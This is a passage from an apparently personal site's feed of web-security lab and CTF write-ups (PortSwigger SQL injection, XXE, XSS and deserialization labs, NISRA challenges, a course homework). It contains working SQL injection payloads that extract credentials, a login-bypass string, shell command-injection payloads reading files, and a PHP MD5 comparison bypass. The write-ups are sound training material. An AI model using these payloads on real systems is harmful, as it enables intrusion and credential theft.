&lt;/h2>
&lt;p>&lt;a href="https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">ysoserial使用方法&lt;/a>&lt;/p></description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</guid><description>&lt;h1 id="lab-exploiting-xxe-via-image-file-upload">
 Lab: Exploiting XXE via image file upload
 &lt;a class="anchor" href="#lab-exploiting-xxe-via-image-file-upload">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.&lt;/li>
&lt;li>Goal: To solve the lab, upload an image that displays the contents of the &lt;code>/etc/hostname&lt;/code> file after processing. Then use the &amp;ldquo;Submit solution&amp;rdquo; button to submit the value of the server hostname.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.&lt;/p></description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</guid><description>&lt;h1 id="lab-modifying-serialized-data-types">
 Lab: Modifying serialized data types
 &lt;a class="anchor" href="#lab-modifying-serialized-data-types">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result&lt;/li>
&lt;li>Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Loose Comparison Operator in &lt;code>PHP&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">
 Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:
 &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Determine # of columns
Payload: &lt;code>?category=Gifts' union select NULL,NULL --&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle">
 Lab: SQL injection attack, listing the database contents on Oracle
 &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
&lt;li>Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: &lt;code>UNION SELECT 'abc' FROM dual&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Determine # of columns
Payload: &lt;code>?category=Lifestyle' union select NULL,NULL from dual--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">
 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
&lt;li>Goal: To solve the lab, display the database version string.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Consider # of column
Payload: &lt;code>?category=Accessories' union select NULL,NULL -- #&lt;/code>&lt;/li>
&lt;li>Consider column type
Payload: &lt;code>?category=Accessories' union select 'a','a' -- #&lt;/code>
Both of them contained text.&lt;/li>
&lt;li>Attack
Payload: &lt;code>?category=Accessories' union select 'abc',@@version -- #&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/vOx5kCK.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">
 Lab: SQL injection attack, querying the database type and version on Oracle
 &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
&lt;li>Our Goal: To solve the lab, display the database version string.&lt;/li>
&lt;/ul>
&lt;h2 id="exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">
 Exp - &lt;a href="https://portswigger.net/web-security/sql-injection/examining-the-database">SQLi Cheat Sheet - Examining the database in SQL injection attacks&lt;/a>
 &lt;a class="anchor" href="#exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">#&lt;/a>
&lt;/h2>
&lt;p>According to the cheat sheet above, we can use the command to fetch the version of this database, e.g.
&lt;img src="https://i.imgur.com/Qxtgz5u.png" alt="" />
:::warning
Before the recon, the hint told you that this database is created by &lt;code>Oracle&lt;/code>. So, you must contained &lt;code>From&lt;/code> preserved word in each query, e.g. &lt;code>SELECT 'abc' FROM dual&lt;/code>
:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">
 Lab: SQL injection UNION attack, determining the number of columns returned by the query
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.&lt;/li>
&lt;li>Hint: To solve the lab, determine the number of columns returned by the query by performing a &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION&lt;/a> attack that returns an additional row containing null values.&lt;/li>
&lt;/ul>
&lt;h4 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h4>
&lt;p>Payload: &lt;code>https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/yZ3QPPF.png" alt="" />
:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text">
 Lab: SQL injection UNION attack, finding a column containing text
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-finding-a-column-containing-text">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.&lt;/li>
&lt;li>Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Determine how many columns it has
You can use the technique from previous question.
Payload: &lt;code>?category=' UNION SELECT NULL,NULL,NULL--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables">
 Lab: SQL injection UNION attack, retrieving data from other tables
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.&lt;/li>
&lt;li>Hint: The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
&lt;/ul>
&lt;h4 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>Using all technique we learned before
According to union-based technique we learned before, we can consider there&amp;rsquo;re 2 columns in this database and both of them are text strings
Payload: &lt;code>?category=Lifestyle' UNION SELECT 'Title name','Post content'--&lt;/code>&lt;/li>
&lt;li>Find the detailed info in &lt;code>users&lt;/code> table
Payload: &lt;code>?category=Lifestyle' UNION SELECT username, password FROM users--&lt;/code>&lt;/li>
&lt;li>Login as administrator
Username: &lt;code>administrator&lt;/code>
Password: &lt;code>5kg73b7jinl9plif82d3&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/kiRM6bX.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">
 Lab: SQL injection UNION attack, retrieving multiple values in a single column
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.&lt;/li>
&lt;li>Hint: The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Consider how many columns in this table
Payload: &lt;code>?category=Lifestyle' UNION SELECT NULL,NULL--&lt;/code>&lt;/li>
&lt;li>Consider the type of each columns
Payload: &lt;code>?category=Lifestyle' UNION SELECT 1,'a'--&lt;/code>
As the payload above, the 1st column is number-based string, and 2nd column is text-based string.
:::spoiler Result
&lt;img src="https://i.imgur.com/9V0cYHD.png" alt="" />
:::&lt;/li>
&lt;li>&lt;font color="FF0000">通靈&lt;/font>: Find username and password
From the result above, there&amp;rsquo;s just one column is text-based string that we can inject, so we can use concatenate operator &lt;code>||&lt;/code> to concatenate two strings that we query together.
Payload: &lt;code>?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users--&lt;/code>
:::spoiler Result
&lt;img src="https://i.imgur.com/d1zw9eY.png" alt="" />
:::&lt;/li>
&lt;li>Login by username and password that we fetch
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/P9CLaQg.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</guid><description>&lt;h1 id="lab-stored-dom-xss">
 Lab: Stored DOM XSS
 &lt;a class="anchor" href="#lab-stored-dom-xss">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality.&lt;/li>
&lt;li>Goal: To solve this lab, exploit this vulnerability to call the &lt;code>alert()&lt;/code> function.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find the injected place
According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.&lt;/p></description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</guid><description>&lt;h1 id="lab-using-application-functionality-to-exploit-insecure-deserialization">
 Lab: Using application functionality to exploit insecure deserialization
 &lt;a class="anchor" href="#lab-using-application-functionality-to-exploit-insecure-deserialization">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>
&lt;p>Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&amp;rsquo;s home directory.&lt;/p>
&lt;p>You can log in to your own account using the following credentials: wiener:peter
You also have access to a backup account: gregg:rosebud&lt;/p></description></item><item><title>NISRA - different places</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</guid><description>&lt;h1 id="nisra---different-places">
 NISRA - different places
 &lt;a class="anchor" href="#nisra---different-places">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-nisra-ctf-web">
 tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41025/">different places&lt;/a>&lt;/p>
&lt;h2 id="exploit---integrate-fragments-flags">
 Exploit - Integrate Fragments Flags
 &lt;a class="anchor" href="#exploit---integrate-fragments-flags">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>View Page Sources
&lt;img src="https://i.imgur.com/q3tSKo5.png" alt="" />
&lt;img src="https://i.imgur.com/yrKjnyr.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>base64 decode
&lt;code>dXNlcm5hbWU6YWRtaW5fcGFzc3dvcmQ6bmlzcmE=&lt;/code> $\to$ &lt;code>username:admin_password:nisra&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Observe the form
It uses get method to fetch the parameters. So we can peek &lt;code>login.php&lt;/code> first.
&lt;img src="https://i.imgur.com/oGFwOoA.png" alt="" />
Then we could use the username and password we got at previous step.
Payload: &lt;code>view-source:http://chall2.nisra.net:41025/login.php?username=admin&amp;amp;password=nisra&lt;/code>
Then we got the last fragment flag.&lt;/p></description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</guid><description>&lt;h1 id="nisra---md5_1">
 NISRA - MD5_1
 &lt;a class="anchor" href="#nisra---md5_1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-nisra-ctf-web">
 tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41022/">MD5_1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
 highlight_file(__FILE__);
 $FROM_INCLUDE = true;
 include(&amp;#34;flag.php&amp;#34;);
 $msg = &amp;#34;&amp;#34;;
 if (isset($_GET[&amp;#39;user&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;])) {
 $user = $_GET[&amp;#39;user&amp;#39;];
 $password = $_GET[&amp;#39;password&amp;#39;];
 $check = &amp;#34;QNKCDZO&amp;#34;;
 // the md5 of &amp;#34;QNKCDZO&amp;#34; is 0e830400451993494058024219903391

 if ($user == &amp;#34;admin&amp;#34; &amp;amp;&amp;amp; $password != $check &amp;amp;&amp;amp; md5($password) == md5($check)) {
 $msg = &amp;#34;Flag: &amp;#34;.$flag;
 } else {
 $msg = &amp;#34;Keep trying!&amp;#34;;
 }
 }

 echo $msg;
?&amp;gt; 
&lt;/code>&lt;/pre>&lt;h2 id="exploit---md5-collision">
 Exploit - MD5 Collision
 &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>http://chall2.nisra.net:41022/?user=admin&amp;amp;password=240610708&lt;/code>
:::spoiler flag
&lt;code>Flag: NISRA{PhP_is_th3_BeST_laNgUA9E}&lt;/code>
:::&lt;/p></description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</guid><description>&lt;h1 id="nisra---md5_2">
 NISRA - MD5_2
 &lt;a class="anchor" href="#nisra---md5_2">#&lt;/a>
&lt;/h1>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>curl http://chall2.nisra.net:41023/ -H &amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot; -X POST -d &amp;quot;user=240610708&amp;amp;password=QNKCDZO&amp;quot;&lt;/code>
Flag: &lt;code>NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://news.ycombinator.com/item?id=9484757">md5(&amp;lsquo;240610708&amp;rsquo;) == md5(&amp;lsquo;QNKCDZO&amp;rsquo;)&lt;/a>&lt;/p></description></item><item><title>NTU CS 2023 HW4 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw4-write-up">
 NTU CS 2023 HW4 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw4-write-up">#&lt;/a>
&lt;/h1>
&lt;h2 id="lab-cat-shop">
 Lab-Cat Shop
 &lt;a class="anchor" href="#lab-cat-shop">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選
&lt;img src="https://hackmd.io/_uploads/SJ3bD8x_T.png" alt="圖片" />
但因為送出的item number可預期，所以還是能夠正常query
&lt;img src="https://hackmd.io/_uploads/HJ6yDUe_a.png" alt="圖片" />&lt;/li>
&lt;li>接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag
&lt;img src="https://hackmd.io/_uploads/Sko9wLldp.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/S1CovLldp.png" alt="圖片" />&lt;/li>
&lt;/ol>
&lt;h2 id="lab-dns-lookuper">
 Lab-DNS Lookuper
 &lt;a class="anchor" href="#lab-dns-lookuper">#&lt;/a>
&lt;/h2>
&lt;p>Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}&lt;/p>
&lt;h3 id="解題流程與思路-1">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;font color="FF0000">&lt;strong>&lt;code>$&lt;/code>&lt;/strong> or &lt;strong>`&lt;/strong>&lt;/font> string to bypass blacklist
Payload:
&lt;code>'$(cat /fla*)'&lt;/code>
&lt;code>'&lt;/code>cat /fl*g*&lt;code>'&lt;/code>&lt;/p>
&lt;h2 id="lab-log-me-in">
 Lab-Log me in
 &lt;a class="anchor" href="#lab-log-me-in">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路-2">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-2">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
&lt;/ul>
&lt;h2 id="lab-jinja2-ssti">
 Lab-Jinja2 SSTI
 &lt;a class="anchor" href="#lab-jinja2-ssti">#&lt;/a>
&lt;/h2>
